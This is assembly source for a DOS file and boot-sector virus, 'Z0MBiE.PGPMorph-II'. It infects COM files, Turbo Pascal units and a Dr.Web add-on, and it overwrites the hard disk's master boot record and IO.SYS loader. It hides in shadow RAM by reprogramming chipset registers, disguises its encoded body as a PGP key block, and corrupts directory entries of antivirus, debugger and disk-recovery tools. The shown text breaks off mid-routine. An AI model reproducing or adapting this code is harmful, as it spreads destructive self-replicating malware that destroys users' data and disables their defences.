
int             macro   xx
                if      xx eq 21h
                    call    call21
                else
                  if    xx eq 03h
                    db      0cch
                  else
                    db      0cdh, xx
                  endif
                endif
                endm

xx              equ     12h
xxxx            equ     1234h

min             equ     '!'
max             equ     'z'

decr_size       equ     19 * (1 + (pgpdecr_size+1)/2 + 1+1)


l               equ     (word ptr 0)
h               equ     (word ptr 2)

o               equ     (word ptr 0)
s               equ     (word ptr 2)

mve             macro   x, y
                push    y
                pop     x
                endm

                ; DTA

dta_struc       struc
                ; internal
dta_driveletter db      ?               ; 0=Ay
dta_name8       db      8 dup (?)       ;
dta_ext3        db      3 dup (?)       ;
dta_searchattr  db      ?               ;
dta_direntrynum dw      ?               ; 0=. 1=..
dta_dircluster  dw      ?
                dd      ?               ; unused
                ; public
dta_attr        db      ?               ; 1=r 32=a 16=d 2=h 4=s 8=v
dta_time        dw      ?               ; чччччммм мммссссс
dta_date        dw      ?               ; гггггггм мммддддд
dta_size        dd      ?
dta_name        db      13 dup (?)
                ends

                ; exe header

exe_struc       struc
exe_mz          dw      ?               ; MZ/ZM
exe_last512     dw      ?
exe_num512      dw      ?
exe_relnum      dw      ?
exe_headersize  dw      ?               ; in PAR
exe_minmem      dw      ?
exe_maxmem      dw      ?
exe_ss          dw      ?
exe_sp          dw      ?
exe_checksum    dw      ?               ; 0
exe_ip          dw      ?
exe_cs          dw      ?
exe_relofs      dw      ?
exe_ovrnum      dw      ?               ; 0
                db      32 dup (?)
exe_neptr       dd      ?
                ends

                ; sys header

sys_header      struc
sys_nextdriver  dd      ?               ; last driver: offset = FFFF
sys_attr        dw      ?
sys_strategy    dw      ?
sys_interrupt   dw      ?
sys_name        db      8 dup (?)
                ends

                ; sft

sft_struc       struc
sft_handles     dw      ?               ; сколько у файла дескрипторов
sft_openmode    dw      ?
sft_attr        db      ?               ; атрибуты файла
sft_flags       dw      ?               ; ВРАНЬЕ бит 14 - сохранять дату/время при закрытии
sft_deviceptr   dd      ?               ; если символьное устр-во - header драйвера
sft_1stcluster  dw      ?               ; начальный кластер файла
sft_date        dw      ?
sft_time        dw      ?
sft_size        dd      ?
sft_pos         dd      ?
sft_lastFclustr dw      ?               ; относительный номер кластера в файле
                                        ; к кототорму было последнее обращение
sft_dirsect     dd      ?               ; сектор содержащий элемент каталога
sft_dirpos      db      ?               ; номер элемента каталога в секторе
sft_name        db      11 dup (?)
sft_chain       dd      ?               ; share.exe
sft_uid         dw      ?               ; share.exe
sft_psp         dw      ?
sft_mft         dw      ?               ; share.exe
sft_lastclust   dw      ?               ; номер кластера к которому было посл. обращ.
sft_ptr         dd      ?               ; указатель на драйвер ifs файла/0 если лок.
                ends

; ===================== PE Header ===========================================

; PE header
; object table
; image pages:          (align: FileAlign)
;   import info
;   export info
;   fixup info
;   resource info
;   debug info
;   ...

; (*) pe header size = NTHeaderSize+18h

pe_struc                struc
pe_id                   dd      ?       ; 00 01 02 03  PE00
pe_cputype              dw      ?       ; 04 05        14C..14E: i386..i586
pe_numofobjects         dw      ?       ; 06 07        число входов в objecttable
pe_datetime             dd      ?       ; 08 09 0A 0B  date/time
pe_COFFtableptr         dd      ?       ; 0C 0D 0E 0F
pe_COFFtablesize        dd      ?       ; 10 11 12 13
pe_NTheadersize         dw      ?       ; 14 15
pe_Flags                dw      ?       ; 16 17
; NTHeader
pe_Magic                dw      ?       ; 18 19
pe_LinkMajor            db      ?       ; 19
pe_LinkMinor            db      ?       ; 1A
pe_SizeOfCode           dd      ?       ; 1C 1D 1E 1F
pe_SizeofInitData       dd      ?       ; 20 21 22 23
pe_SizeOfUninitData     dd      ?       ; 24 25 26 27
pe_EntryPointRVA        dd      ?       ; 28 29 2A 2B
pe_BaseOfCodeRVA        dd      ?       ; 2C 2D 2E 2F
pe_BaseOfDataRVA        dd      ?       ; 30 31 32 33
pe_ImageBase            dd      ?       ; 34 35 36 37    align: 64k
  ; выравниваение программных секций
pe_ObjectAlign          dd      ?       ; 39 30 3A 3B  256N > power2 > 512
pe_FileAlign            dd      ?       ; 3C 3D 3E 3F   64K > power2 > 512
pe_OSMajor              dw      ?       ; 40 41
pe_OSMinor              dw      ?       ; 42 43
pe_USERMajor            dw      ?       ; 44 45
pe_USERMinor            dw      ?       ; 46 47
pe_SubSysMajor          dw      ?       ; 48 49
pe_SubSysMinor          dw      ?       ; 4A 4B
                        dd      ?       ; 4C 4D 4E 4F
pe_ImageSize            dd      ?       ; 50 51 52 53  align: ObjectAlign
pe_HeaderSize           dd      ?       ; 54 55 56 57  dosH+peH+objecttable
pe_CheckSum             dd      ?       ; 58 59 5A 5B  0
pe_SubSystem            dw      ?       ; 5C 5D
pe_DLLFlags             dw      ?       ; 5E 5F
pe_StackReserveSize     dd      ?       ; 60 61 62 63
pe_StackCommitSize      dd      ?       ; 64 65 66 67
pe_HeapReserveSize      dd      ?       ; 68 69 6A 6B
pe_HeapCommitSize       dd      ?       ; 6C 6D 6E 6F
pe_LoaderFlags          dd      ?       ; 70 71 72 73
pe_NumOfRVAandSizes     dd      ?       ; 74 75 76 77   =10H
; VA/Sizes
pe_ExportTableRVA       dd      ?       ; 78 79 7A 7B
pe_ExportTableSize      dd      ?       ; 7C 7D 7E 7F
pe_ImportTableRVA       dd      ?       ; 80 81 82 83
pe_ImportTableSize      dd      ?       ; 84 85 86 87
pe_ResourceTableRVA     dd      ?       ; 88 89 8A 8B
pe_ResourceTableSize    dd      ?       ; 8C 8D 8E 8F
pe_ExceptionTableRVA    dd      ?       ; 90 91 92 93
pe_ExceptionTableSize   dd      ?       ; 94 95 96 97
pe_SecurityTableRVA     dd      ?       ; 98 99 9A 9B
pe_SecurityTableSize    dd      ?       ; 9C 9D 9E 9F
pe_FixupTableRVA        dd      ?       ; A0 A1 A2 A3
pe_FixupTableSize       dd      ?       ; A4 A5 A6 A7
pe_DebugTableRVA        dd      ?       ; A8 A9 AA AB
pe_DebugTableSize       dd      ?       ; AC AD AE AF
pe_ImgDescrRVA          dd      ?       ; B0 B1 B2 B3
pe_ImgDescrSize         dd      ?       ; B4 B5 B6 B7
pe_MachineRVA           dd      ?       ; B8 B9 BA BB
pe_MachineSize          dd      ?       ; BC BD BE BF
pe_TLSRVA               dd      ?       ; C0 C1 C2 C3
pe_TLSSize              dd      ?       ; C4 C5 C6 C7
pe_LoadCFGRVA           dd      ?       ; C8 C9 CA CB
pe_LoadCFGSize          dd      ?       ; CC CD CE CF
                        dq      ?       ; D0 D1 D2 D3 D4 D5 D6 D7
pe_IATTableRVA          dd      ?       ; D8 D9 DA DB
pe_IATTableSize         dd      ?       ; DC DD DE DF
                        dq      ?       ; E0 E1 E2 E3 D4 E5 E6 E7
                        dq      ?       ; E8 E9 EA EB EC ED EE EF
                        dq      ?       ; F0 F1 F2 F3 F4 F5 F6 F7
pe_TotalStructureSize   dd      ?       ;
                        ends

; ===================== ObjectTable =========================================

; pe_NumOfObjects - число объектов

                        ; Object Entry
oe_struc                struc
oe_ObjectName           db      8 dup (?);00 01 02 03 04 05 06 07
oe_VirtualSize          dd      ?       ; 08 09 0A 0B
oe_SectionRVA           dd      ?       ; 0C 0D 0E 0F  align: ObjectAlign
oe_PhysicalSize         dd      ?       ; 10 11 12 13
oe_PhysicalOffset       dd      ?       ; 14 15 16 17  align: FileAlign
                        db     16 dup (?);for OBJ file   18
oe_ObjectFlags          dd     ?        ; 28 29 2A 2B
oe_TotalStructureSize   dd     ?        ;
                        ends


                .model  tpascal
                .386p
                .code
                assume  cs:code, ds:code, es:code
                locals  @@
                jumps

                org     100h
web_fuck:
start:
                nop
                nop
                nop

                mov     start.byte ptr 0, 0e9h
                mov     start.word ptr 1, web_fuck_real - start - 3

                mov     ah, 9
                lea     dx, mainmsg
                int     21h

                lea     dx, testfile
                call    infectfile

                mov     ax, 4c00h
                int     21h

testfile        db      'tst.com',0
tempfile        db      'z0mbie$$.$$$',0

tpu_start:      call    infectsec

                retf

web_fuck_real:  pusha
                push    ds es

                mve     ds, cs
                call    $+3
                pop     si
                sub     si, offset $-1-start

                mve     es, 0ba00h
                mov     di, 100h

                mov     cx, virsize
                cld
                rep     movsb

                db      09ah
                dw      offset far_in_vmem
                dw      0ba00h

                mov     ax, 3
                int     10h

                mov     ax, 4c00h       ; terminate dr.web
                int     21h

far_in_vmem:    mov     cs:save_ss, ss
                mov     cs:save_sp, sp
                mov     ax, cs
                mov     ss, ax
                mov     sp, 0100h

                call    infectsec

                lss     sp, cs:save_sssp
                retf

mainmsg:        db      10 dup (13,10)

                db      'Z0MBiE.PGPMorph-II  [optimized]  Release 2  (c) 1997, 1998 Z0MBiE International',13,10
                db      'WebAddOn, COM, TPU=>EXE infector',13,10
                db      13,10
                db      '  ОБЪЕКТИВНАЯ РЕАЛЬНОСТЬ - ЭТО БРЕД, ВЫЗВАННЫЙ НЕДОСТАТКОМ АЛКОГОЛЯ В КРОВИ',13,10
                db      13,10
                db      'HomePage: http://www.chat.ru/~z0mbie',13,10
                db      'E-Mail:   z0mbie@chat.ru',13,10
                db      13,10
                db      'Greetings to:',13,10
                db      '  S.S.R.       - IQ/age=max',13,10
                db      '  LordASD     - thanx for help!',13,10
                db      '  Zhengxi      - когда позвонишь?',13,10
                db      '  Nutcracker   - привет! предлагаю переписываться по V-Mail',13,10
                db      '  Soul Manager - hi! whats new? whats new about our idea?',13,10
                db      '  ...',13,10
                db      13,10
                db      'Scorpions is BEST!',13,10
                db      13,10

                db      '$'

                db      10 dup (13,10)

infectsec:      pushad
                push    ds es fs gs

                mve     ds, cs
                mve     es, cs

                mov     ax, 0201h
                mov     cx, 0001h
                mov     dx, 0180h
                lea     bx, xbuf
                int     13h

                cmp     xbuf.word ptr 510, 0aa55h
                jne     @@exit

                lea     dx, c_iosys

                call    openfile
                jc      @@exit

                lea     dx, xbuf
                mov     cx, 512
                call    readfile

                cmp     xbuf.byte ptr 0, 0e9h
                jne     @@close

                mov     ax, xbuf.word ptr 3
                cmp     al, 6      ; dos 6
                jne     @@close
                mov     vsector.word ptr 3, ax

                cmp     xbuf.word ptr [v_id-vsector], 'z0'      ; alredy?
                je      @@close

                push    bx

                mov     ax, 0301h
                mov     cx, 003Fh
                mov     dx, 0080h
                mve     es, cs
                lea     bx, xbuf
                int     13h

virsec          equ     (virsize+511)/512

                mov     ax, 0300h + virsec
                mov     cx, 0030h
                mov     dx, 0080h
                mve     es, cs
                lea     bx, start
                int     13h

                pop     bx

                call    seekbegin

                call    fuck_sft

                lea     dx, vsector
                mov     cx, vsector_size
                call    writefile

@@close:        call    closefile

@@exit:         pop     gs fs es ds
                popad
                ret

c_iosys         db      'c:\io.sys',0

vsector:        db      0e9h
                dw      2
                dw      ?       ; dos version

                pusha
                push    ds es

                mov     ax, 0200h + virsec
                mov     cx, 0030h
                mov     dx, 0080h
                mve     es,0ba00h
                mov     bx, 0100h
                int     13h

                cmp     word ptr es:[bx + v_id-start], 'z0'
v_id            equ     word ptr $-2
                jne     $

                db      0eah
                dw      vcall_cont
                dw      0ba00h

vsector_size    equ     $-vsector

vcall_cont:     call    tsr

                mov     ax, 0201h
                mov     cx, 003fh
                mov     dx, 0080h
                mve     es, 0070h
                mov     bx, 0
                int     13h

                pop     es ds
                popa

                db      0eah
                dw      0000h
                dw      0070h

flush_cache:    push    ds
                mov     ax, 9000h
@@2:            mov     ds, ax
                xor     si, si
                mov     cx, 16384
                cld
                rep     lodsw
                sub     ax, 1000h
                js      @@1
                mov     es, ax
                jmp     @@2
@@1:            pop     ds
                ret

tsr:           ; mov     ax, 0e00h + '?'
               ; mov     bx, 7
               ; int     10h
               ;
               ; xor     ax, ax
               ; int     16h
               ;
               ; or      al, 32
               ; cmp     al, 'y'
               ; jne     rt
               ;
               ; int 3

                pushad

                mve     es, 0c000h
                cmp     byte ptr es:[0002h], 80h
                ja      skip_tsr

                call    flush_cache

                call    get_sh_state
                or      sh_R, seg_C000_64k + seg_D000_32k
                or      sh_C, seg_C000_64k + seg_D000_32k
                pusha
                or      sh_W, seg_C000_64k + seg_D000_32k
                call    set_sh_state

                pushf
                cli

                mve     es, 0
                les     bx, es:[08h*4]
                mov     cs:v_old08.o, bx
                mov     cs:v_old08.s, es
                mve     es, 0
                les     bx, es:[13h*4]
                mov     cs:v_old13.o, bx
                mov     cs:v_old13.s, es

                mve     es, 0
                mov     es:[08h*4].o, offset v_int08
                mov     es:[08h*4].s, 0d000h
                mov     es:[13h*4].o, offset v_int13
                mov     es:[13h*4].s, 0d000h

                mve     es, 0c000h
                mov     byte ptr es:[0002h], 0c0h       ; 64k+32k

                mve     ds, cs
                lea     si, start
                mve     es, 0d000h
                xor     di, di

                mov     ax, 0aa55h
                stosw
                mov     al, 40h
                stosb

                mov     di, si

                mov     cx, virsize
                cld
                rep     movsb

                popf

                popa
                call    set_sh_state

skip_tsr:       popad
rt:             ret

;web_fuck_size   equ     $-web_fuck
web_fuck_size   equ     virsize

v_int08:        nop
                nop

                db      0eah
v_old08         dd      ?

v_int13:        cmp     ah, 2
                jne     v_exit13

                push    cx

                push    ax

                pushf
                call    cs:v_old13

                pop     cx

                call    fuck_sector

                pop     cx

                retf    2

v_exit13:       db      0eah
v_old13         dd      ?

fuck_sector:    pushf
                pusha
                cld

                xor     ch, ch
                shl     cx, 4
                jcxz    @@exit

;                mov     si, bx
;                mov     di, cx
;
;@@q:           ; cmp     byte ptr es:[si+0], 0f0h
;               ; jae     @@exit
;               ; test    byte ptr es:[si+0bh], 11000000b
;               ; jnz     @@exit
;               ; cmp     dword ptr es:[si+10h], 0
;               ; jne     @@exit
;               ; cmp     word ptr es:[si+14h], 0
;               ; jne     @@exit
;
;                add     si, 32
;
;                dec     di
;                jnz     @@q


@@1:            call    isbadname
                jnc     @@3

               ; int 3
                mov     byte ptr es:[bx+00h], 0e5h
                and     word ptr es:[bx+1ah], 05555h  ; 1st cluster

@@3:            add     bx, 32
                loop    @@1

@@exit:         popa
                popf
                ret

isbadname:      pusha

                lea     bp, badnames

@@3:            xor     si, si

@@2:            mov     al, cs:[bp+si]
                cmp     al, '·'
                je      @@4

                cmp     al, es:[bx+si]
                jne     @@1

@@4:            inc     si
                cmp     si, 8+3
                jb      @@2

                stc
                jmp     @@5

@@1:            add     bp, 8+3
                cmp     bp, offset badnames_end
                jb      @@3

                ; clc тут не нужно, это на всякий случай
                clc

@@5:            popa
                ret

badnames:       db      'ANTI·······'   ; немного подпортим винт юзеру ;))
                db      'AIDS·······'   ; чтобы нас не вылечили,
                db      'ADINF······'
                db      '········░░░'
                db      'AVP········'
                db      '········AVB'
                db      '········AVC'
                db      '········CPS'
                db      '········MS·'
                db      'WEB········'
                db      'DRWEB······'
                db      'F-PROT·····'
                db      'NOD········'
                DB      'GUARD······'
                DB      'CLEAN······'
                DB      'TBAV·······'
                DB      'TBCLEAN····'
                DB      'TBSCAN·····'
                DB      'TBMEM······'
                DB      'NAV········'
                DB      'CLEAN······'
                DB      'VSAFE······'
                DB      'BOOTSAFE···'
                DB      'TNTVIRUS···'
                DB      'CARMEL·····'
                DB      'UNITA3·····'
                DB      'GII     ···'
                DB      'AVAST······'
                DB      'SCAN·······'
                DB      'S-ICE······'   ; не отладили,
                DB      'WINICE·····'
                DB      'TD······EXE'
                DB      'DEBUG······'
                DB      'FORMAT·····'   ; и не отформатировали...
                DB      'FDISK······'
                DB      'SYS     ···'
                DB      'UNDELETE···'
                DB      'UNFORMAT···'
                DB      'UNERASE····'
                DB      'DISKEDIT···'   ; а также не....
                DB      'DE      EXE'
                DB      'DISKTOOL···'
                DB      'IMAGE   IDX'
                DB      'MIRROR·····'
                DB      '-D      ···'
                DB      '-U      ···'
                DB      'HIEW·······'
                DB      'VC·········'   ; и этот сакс тоже...
badnames_end:

                ; input: ds:dx=file name

infectfile:     pusha
                push    ds es

                mov     ah, 60h
                mov     si, dx
                push    cs
                pop     es
                lea     di, tpu_name
                int     21h

                mov     ah, 2fh
                int     21h
                push    es
                push    bx

                mve     ds, cs
                lea     dx, dta
                call    setdta

                mov     ah, 4eh
                mov     cx, 1+2+4+32
                lea     dx, tpu_name
                int     21h

                pop     dx
                pop     ds
                call    setdta

                jc      @@exit

                mve     ds, cs
                mve     es, cs

                mov     dx, dta.dta_size.h
                mov     ax, dta.dta_size.l
                or      dx, dx
                jnz     @@exit
                cmp     ax, 2000
                jbe     @@exit
                cmp     ax, 50000
                jae     @@exit
                test    ax, 0000001111111111b
                jz      @@exit
                mov     cx, 1000
                div     cx
                or      dx, dx
                jz      @@exit

                cmp     dword ptr dta.dta_name8, '8BEW'
                jne     @@yy
                cmp     word ptr dta.dta_ext3, '23'
                jne     @@yy
                mov     ftype, 3
                jmp     @@retrain

@@yy:           cmp     word ptr dta.dta_ext3, 'PT'
                jne     @@xx
                cmp     byte ptr dta.dta_ext3+2, 'U'
                jne     @@xx
                mov     ftype, 1
                jmp     @@retrain

@@xx:           cmp     word ptr dta.dta_ext3, 'OC'
                jne     @@exit
                mov     ftype, 2

@@retrain:      mov     ax, word ptr dta.dta_size
                add     ax, 100h + msg1size
                mov     sux1, ax

                call    random
                and     ax, 0fffh
                mov     sux2, ax

                finit
                fild    sux1
                fild    sux2
                fsub
                fist    sux1

                lea     dx, tpu_name
                call    openfile
                jc      @@exit

                call    fuck_sft

                mve     ds, cs
                mve     es, cs

                cmp     ftype, 3
                je      web_infectdop

                lea     dx, bytes
                mov     cx, bytessize
                call    readfile

                call    seekbegin

                lea     dx, buf
                mov     cx, 512
                call    readfile

                cmp     ftype, 1
                jne     @@xxx
                cmp     dword ptr buf, 'QUPT'
                je      infecttpu

@@xxx:          cmp     bytes[com_id-comjmp], 255
                je      @@close

                call    seekbegin

                lea     dx, comjmp
                mov     cx, comjmpsize
                call    writefile

                call    seekend

                push    bx
                call    make_pgp
                pop     bx

                lea     dx, outbuf
                lea     cx, [di + -(offset outbuf)]
                call    writefile

                inc     com_infected

@@close:        call    closefile

@@exit:         pop     es ds
                popa
                ret

setdta:         mov     ah, 1ah
                int     21h
                ret

openfile:       mov     ax, 3d00h
                int     21h
                xchg    bx, ax
                ret

fuck_sft:       push    bx
                mov     ax, 1220h
                int     2fh
                mov     bl, es:[di]
                mov     ax, 1216h
                int     2fh
                pop     bx
                mov     es:[di].sft_openmode, 2
                ret

closefile:      mov     ah, 3eh
                int     21h
                ret

seekend:        mov     ax, 4202h
                jmp     cxx

seekbegin:      mov     ax, 4200h
cxx:            cwd
                xor     cx, cx
                int     21h
                ret

comjmp:         fninit
                fild    word ptr ds:[100h+sux1-comjmp]
                fild    word ptr ds:[100h+sux2-comjmp]
                fadd
                fist    word ptr ds:[100h+sux3-comjmp]
                jmp     word ptr ds:[100h+sux3-comjmp]
sux2            dw      ?
sux3            dw      ?
sux1            dw      ?
com_id          db      255
comjmpsize      equ     $-comjmp


call21:         db      0cdh,21h
                ret

make_pgp:       lea     bp, outbuf + decr_size + msg1size
                mov     di, bp
                xor     dx, dx

                mov     cx, (pgpdecr_size+7)/8
@@b:            push    cx

                mov     cx, 8
@@a:            call    rnd_ax
                stosw
                loop    @@a

                call    crlf

                pop     cx
                loop    @@b

                mov     save_dx, dx

                lea     di, outbuf
                xor     dx, dx

                lea     si, msg1
                mov     cx, msg1size
                rep     movsb

                mov     ax, 100h + decr_size + msg1size   ; SI <- offset decoder
                add     ax, dta.dta_size.l
                call    mov_ax          ; 10

                mov     ax, xxxx
                org     $-2
                push    ax
                pop     si
                stosw                   ; 2

                mov     al, xx
                org     $-1
                sub     ax, xxxx
                org     $-2
                stosb                   ; 1
                call    rnd_ax
                stosw                   ; 2

                mov     al, xx
                org     $-1
                dec     ax
                stosb                   ; 1

                call    crlf            ; 3

                lea     si, pgpdecr_start

@@1:            lodsw                   ; DI <- data

                xor     ax, [bp]
                inc     bp
                inc     bp

                call    mov_ax          ; 10
                mov     ax, xxxx
                org     $-2
                push    ax
                pop     di
                stosw                   ; 2

                mov     ax, xxxx
                org     $-2
                xor     [bx+si], di
                stosw                   ; 2

                mov     al, xx
                org     $-1
                inc     si
                stosb                   ; 1
                stosb                   ; 1

                call    crlf            ; 3

                cmp     si, offset pgpdecr_end
                jb      @@1

                mov     ax, xxxx
                org     $-2
                jz      $+4+15+19
                stosw                   ; 2
                mov     ax, xxxx
                org     $-2
                jnz     $+2+15+19
                stosw                   ; 2

                mov     cx, 6           ; 12
@@2:            call    rnd_ax
                stosw
                loop    @@2

                call    crlf            ; 3

                mov     cx, 8           ; 16
@@3:            call    rnd_ax
                stosw
                loop    @@3

                call    crlf            ; 3

                mov     di, bp
                mov     dx, save_dx
                ;xor     dx, dx

                lea     si, start
                mov     cx, (virsize + 7) / 8
@@5:            push    cx
                mov     cx, 8           ; 16
@@4:            lodsb
                aam     16
                add     ax, '77'
                stosw
                loop    @@4
                call    crlf            ; 3
                pop     cx
                loop    @@5

                lea     si, msg2
                mov     cx, msg2size
                rep     movsb

                ret

mov_ax:         push    ax bx cx dx  bp

                mov     bp, ax

@@0:            call    rnd_ax
                xchg    bx, ax
                call    rnd_ax
                xchg    cx, ax

                jmp     @@4

                mov     bl, min
@@1:            mov     bh, min
@@2:            mov     cl, min
@@3:            mov     ch, min

@@4:            mov     dx, bx
                sub     dx, cx
                xor     dx, bp

                cmp     dl, min
                jb      @@sux
                cmp     dl, max
                ja      @@sux
                cmp     dh, min
                jb      @@sux
                cmp     dh, max
                ja      @@sux

                mov     al, xx          ; push    xxxx
                org     $-1
                push    xxxx
                org     $-2
                stosb
                mov     ax, bx
                stosw
                mov     al, xx          ; pop     ax
                org     $-1
                pop     ax
                stosb

                mov     al, xx          ; sub     ax, xxxx
                org     $-1
                sub     ax, xxxx
                org     $-2
                stosb
                mov     ax, cx
                stosw

                mov     al, xx          ; xor     ax, xxxx
                org     $-1
                xor     ax, xxxx
                org     $-2
                stosb
                mov     ax, dx
                stosw

                jmp     @@ret

@@sux:          inc     ch
                cmp     ch, max
                jbe     @@4
                inc     cl
                cmp     cl, max
                jbe     @@3
                inc     bh
                cmp     bh, max
                jbe     @@2
                inc     bl
                cmp     bl, max
                jbe     @@1

                ;int 3
                jmp     @@0

@@ret:          pop     bp  dx cx bx ax

                ret

rnd_ax:         call    random
                cmp     al, min
                jb      rnd_ax
                cmp     al, max
                ja      rnd_ax
                cmp     ah, min
                jb      rnd_ax
                cmp     ah, max
                ja      rnd_ax
                ret

crlf:           mov     al, xx
                org     $-1
                sub     ax, xxxx
                org     $-2

                push    ax
                call    random
                test    al, 1
                pop     ax
                jz      @@2

                xor     al, 35h xor 2dh   ; xor <--> sub

@@2:            stosb

                mov     ax, xxxx
                org     $-2
                db      13,10

                inc     dx
                and     dl, 3
                jz      @@1

                call    rnd_ax

@@1:            stosw
                ret

start_com:      mve     ds, cs
                lea     si, bytes
                mov     es, dx
                mov     di, 0100h
                push    es
                push    di

                mov     cx, bytessize
                rep     movsb

                pusha
                push    ds es
                mov     cs:save_ss, ss
                mov     cs:save_sp, sp

                mov     ax, cs
                mov     ss, ax
                xor     sp, sp

                mov     ds, ax
                mov     es, ax
                cld

                inc     counter

                call    infectsec
                call    infectdir

                lss     sp, cs:save_sssp

                pop     es ds
                popa

                xor     ax, ax
                xor     bx, bx
                mov     cx, 000ffh
                mov     si, 00100h
                mov     di, 0091ch
                mov     bp, 0fffeh
                mov     ds, dx
                mov     es, dx
                push    7202h
                popf

                retf

save_sssp       label   dword
save_sp         dw      ?
save_ss         dw      ?

infectdir:      mov     ah, 2fh
                int     21h
                push    es
                push    bx

                mov     ah, 1ah
                mve     ds, cs
                lea     dx, searchdta
                int     21h

                mov     com_infected, 0
                mov     tpu_infected, 0

                mov     ah, 4eh
                mov     cx, 1+2+4+32
                lea     dx, filemask
@@1:            int     21h
                jc      @@2

                lea     dx, searchdta.dta_name
                call    infectfile
                cmp     com_infected, 1
                je      @@2
                cmp     tpu_infected, 1
                je      @@2

                mov     ah, 4fh
                jmp     @@1

@@2:            pop     dx
                pop     ds
                call    setdta

                ret

filemask        db      '*.*',0
counter         dd      0

pgpdecr_start:  ;int 3
                nop

                mov     dx, cs

                call    $+3
                pop     si
                sub     si, $-1-pgpdecr_start
                add     si, pgpdecr_size

                mov     ax, cs
                add     ax, 1000h
                mov     es, ax
                mov     di, 100h

                mov     cx, (virsize + 7) / 8
@@2:            push    cx
                mov     cx, 8
@@1:            lodsw
                sub     ax, '77'
                aad     16
                stosb
                loop    @@1
                lodsb
                lodsw
                pop     cx
                loop    @@2

                push    es
                push    offset start_com
                retf

                nop

pgpdecr_end:
pgpdecr_size    equ     pgpdecr_end-pgpdecr_start

bytessize       equ     comjmpsize + 32
bytes           db      bytessize dup ('?')



;                ┌┬─────────────────── unused
;                ││ ┌───────────────── reserved
;                 
; BX=readable    00x? xxxx xxxx xxxx B
; CX=writeable   00x? xxxx xxxx xxxx B
; DX=cacheable   00x? xxxx xxxx xxxx B
; SI=reserved    00x? xxxx xxxx xxxx B
;                      
;                  │  ││││ ││││ │││└── EC00, 16K
;                  │  ││││ ││││ ││└─── E800, 16K
;                  │  ││││ ││││ │└──── E400, 16K
;                  │  ││││ ││││ └───── E000, 16K
;                  │  ││││ ││││
;                  │  ││││ │││└─────── DC00, 16K
;                  │  ││││ ││└──────── D800, 16K
;                  │  ││││ │└───────── D400, 16K
;                  │  ││││ └────────── D000, 16K
;                  │  ││││
;                  │  │││└──────────── CC00, 16K
;                  │  ││└───────────── C800, 16K
;                  │  │└────────────── C400, 16K
;                  │  └─────────────── C000, 16K
;                  │
;                  └────────────────── F000, 64k

sh_R            equ     bx
sh_W            equ     cx
sh_C            equ     dx
sh_X            equ     si

seg_all         equ     0010111111111111b

seg_F000_64k    equ     0010000000000000b

seg_C000_64k    equ     0000111100000000b
seg_C000_32k    equ     0000110000000000b
seg_C800_32k    equ     0000001100000000b
seg_C000_16k    equ     0000100000000000b
seg_C400_16k    equ     0000010000000000b
seg_C800_16k    equ     0000001000000000b
seg_CC00_16k    equ     0000000100000000b

seg_D000_64k    equ     0000000011110000b
seg_D000_32k    equ     0000000011000000b
seg_D800_32k    equ     0000000000110000b
seg_D000_16k    equ     0000000010000000b
seg_D400_16k    equ     0000000001000000b
seg_D800_16k    equ     0000000000100000b
seg_DC00_16k    equ     0000000000010000b

seg_E000_64k    equ     0000000000001111b
seg_E000_32k    equ     0000000000001100b
seg_E800_32k    equ     0000000000000011b
seg_E000_16k    equ     0000000000001000b
seg_E400_16k    equ     0000000000000100b
seg_E800_16k    equ     0000000000000010b
seg_EC00_16k    equ     0000000000000001b


read_cf8:
cf8_read:       mov     ax, 8000h
                shl     eax, 10h
                mov     ax, cx
                and     al, not 3
                mov     dx, 0CF8h
                out     dx, eax
                add     dl, 4
                mov     al, cl
                and     al, 3
                add     dl, al
                in      al, dx
                ret

write_cf8:
cf8_write:      xchg    ax, cx
                shl     ecx, 10h
                xchg    ax, cx
                mov     ax, 8000h
                shl     eax, 10h
                mov     ax, cx
                and     al, not 3
                mov     dx, 0CF8h
                out     dx, eax
                add     dl, 4
                mov     al, cl
                and     al, 3
                add     dl, al
                shr     ecx, 10h
                mov     ax, cx
                out     dx, al
                ret

get_sh_state:   mov     di, 0059h

@@1:            push    cx dx
                mov     cx, di
                call    cf8_read
                pop     dx cx

                mov     ah, 2

@@2:            shl     al, 1
                rcl     si, 1

                shl     al, 1
                rcl     dx, 1

                shl     al, 1
                rcl     cx, 1

                shl     al, 1
                rcl     bx, 1

                dec     ah
                jnz     @@2

                inc     di
                cmp     di, 005fh
                jbe     @@1

                ret

set_sh_state:   mov     di, 005Fh

@@1:            mov     ah, 2

@@2:            shr     bx, 1
                rcr     al, 1

                shr     cx, 1
                rcr     al, 1

                shr     dx, 1
                rcr     al, 1

                shr     si, 1
                rcr     al, 1

                dec     ah
                jnz     @@2

                push    cx dx
                mov     cx, di
                call    cf8_write
                pop     dx cx

                dec     di
                cmp     di, 0059h
                jae     @@1

                ret

                ; random number generator

                ; output: ax=rnd(65536)
                ;         zf=rnd(2)

random:         push    bx
                mov     bx, 1234h
rndword         equ     word ptr $-2
                in      al, 40h
                xor     bl, al
                in      al, 40h
                add     bh, al
                in      al, 41h
                sub     bl, al
                in      al, 41h
                xor     bh, al
                in      al, 42h
                add     bl, al
                in      al, 42h
                sub     bh, al
                mov     cs:rndword, bx
                xchg    bx, ax
                pop     bx
                test    al, 1
                ret

                ; input:  ax
                ; output: ax=rnd(ax)
                ;         zf=rnd(2)

rnd:            push    bx
                push    dx
                xchg    bx, ax
                call    random
                xor     dx, dx
                div     bx
                xchg    dx, ax
                pop     dx
                pop     bx
                test    al, 1
                ret


msg1            db      13,10
                db      '-----BEGIN PGP PUBLIC KEYBLOCK-----',13,10
                db      'Version: 2.6.3i',13,10
                db      13,10
msg1size        equ     $-msg1

msg2            db      13,10
                db      '-----END PGP PUBLIC KEYBLOCK-----',13,10
msg2size        equ     $-msg2

; ===========================================================================


infecttpu:      pusha
                call    inittpucode
                popa

                mve     ds, cs
                mve     es, cs

                call    seekbegin

                lea     dx, uh         ; читаем UH - хеадер TPUшника
                mov     cx, uhsize
                call    readfile

                cmp     uh.eye, 'QUPT'  ; проверим хеадер на 'TPUQ'
                jne     @@close
                cmp     uh.xxx, 0
                jne     @@close
                cmp     uh.zdt, 0    ; oops. во всех тестируемых мной
                jne     @@close        ; юнитах эта фишка равна нулю :(((

                cmp     uh.ALREDY, 'Z0'
                je      @@close
                mov     uh.ALREDY, 'Z0'

                xor     cx, cx         ; читаем UHLSF - source file list
                mov     dx, uh.lsf   ; чтобы найти из него имя юнита
                call    seekfile
                lea     dx, buf        ; читаем в буфер
                mov     cx, uh.dbt   ; вычислив размер UHLSF
                sub     cx, uh.lsf
                call    readfile

                lea     si, buf + 7    ; ptr на pascal-style имя сорца юнита
                lodsb                  ; размер имени
